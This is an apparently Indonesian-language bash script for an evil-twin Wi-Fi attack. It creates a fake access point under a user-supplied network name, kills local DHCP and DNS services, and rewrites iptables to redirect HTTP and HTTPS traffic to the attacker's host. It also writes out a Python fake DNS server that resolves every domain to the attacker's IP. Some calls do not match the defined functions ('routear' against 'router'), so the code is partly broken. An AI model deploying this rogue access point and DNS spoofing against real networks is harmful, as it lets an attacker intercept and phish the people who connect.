
if [ ! -d $DUMP_PATH ]; then
        mkdir -p $DUMP_PATH &
fi

buatfakedns

printf "Nama wifi : "
read WIFI

serang

function serang {	
   xterm -bg "#000000" -fg "#00aa00" -title "Buat Wifi palsu" -e create_ap wlp9s0 wlp9s0 "$WIFI" &
   
   sleep 5 &
   routear &
   sleep 3
   killall dhcpd &
   fuser -n tcp -k 53 67 80 &
   fuser -n udp -k 53 67 80 &

   xterm $BOTTOMLEFT -bg "#000000" -fg "#99CCFF" -title "FAKEDNS" -e "if type python2 >/dev/null 2>/dev/null; then python2 $DUMP_PATH/fakedns; else python $DUMP_PATH/fakedns; fi"
}

function router {

        ifconfig ap0 up
        ifconfig ap0 $IP netmask 255.255.255.0

        route add -net $RANG_IP.0 netmask 255.255.255.0 gw $IP
        sysctl -w net.ipv4.ip_forward=1

  iptables --flush
  iptables --table nat --flush
  iptables --delete-chain
  iptables --table nat --delete-chain
  iptables -P FORWARD ACCEPT

  iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination $IP:80
  iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination $IP:443
  iptables -A INPUT -p tcp --sport 443 -j ACCEPT
  iptables -A OUTPUT -p tcp --dport 443 -j ACCEPT
  iptables -t nat -A POSTROUTING -j MASQUERADE

}

function buatfakedns {
	echo "import socket

class DNSQuery:
  def __init__(self, data):
    self.data=data
    self.dominio=''

    tipo = (ord(data[2]) >> 3) & 15
    if tipo == 0:
      ini=12
      lon=ord(data[ini])
      while lon != 0:
        self.dominio+=data[ini+1:ini+lon+1]+'.'
        ini+=lon+1
        lon=ord(data[ini])

  def respuesta(self, ip):
    packet=''
    if self.dominio:
      packet+=self.data[:2] + \"\x81\x80\"
      packet+=self.data[4:6] + self.data[4:6] + '\x00\x00\x00\x00'
      packet+=self.data[12:]
      packet+='\xc0\x0c'
      packet+='\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04'
      packet+=str.join('',map(lambda x: chr(int(x)), ip.split('.')))
    return packet

if __name__ == '__main__':
  ip='$IP'
  print 'pyminifakeDwebconfNS:: dom.query. 60 IN A %s' % ip

  udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  udps.bind(('',53))

  try:
    while 1:
      data, addr = udps.recvfrom(1024)
      p=DNSQuery(data)
      udps.sendto(p.respuesta(ip), addr)
      print 'Request: %s -> %s' % (p.dominio, ip)
  except KeyboardInterrupt:
    print 'Finalizando'
    udps.close()" > $DUMP_PATH/fakedns
        chmod +x $DUMP_PATH/fakedns
}



